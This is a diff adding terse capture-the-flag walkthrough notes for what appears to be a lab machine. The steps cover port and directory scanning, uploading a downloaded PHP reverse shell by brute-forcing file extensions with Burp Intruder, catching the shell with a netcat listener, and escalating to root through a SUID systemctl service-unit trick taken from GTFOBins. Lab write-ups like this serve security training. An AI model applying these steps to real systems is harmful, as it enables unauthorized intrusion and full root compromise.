@@ -1,0 +1,27 @@
+>> nmap -sV 10.10.227.117
+
+>> gobuster dir -u http://10.10.227.117:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+>> download https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+Capture the request. Send it to intruder then change select the §.php§ and open the Payloads. load phpext.txt to payload setting and deselect payload encoding. Then start the attack
+changed 
+
+change the php extension according to the returned response from burpsuite. 
+
+>> sudo nc -lvnp 1234
+
+On the target system >> find / -user root -perm -4000 -exec ls -ldb {} \;
+
+Search "systemctl" in https://gtfobins.github.io/ 
+
+Then;
+>>  TF=$(mktemp).service
+    echo '[Service]
+    ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+    [Install]
+    WantedBy=multi-user.target' >$TF
+    /bin/systemctl link $TF
+    /bin/systemctl enable --now $TF
+
+cat /tmp/output
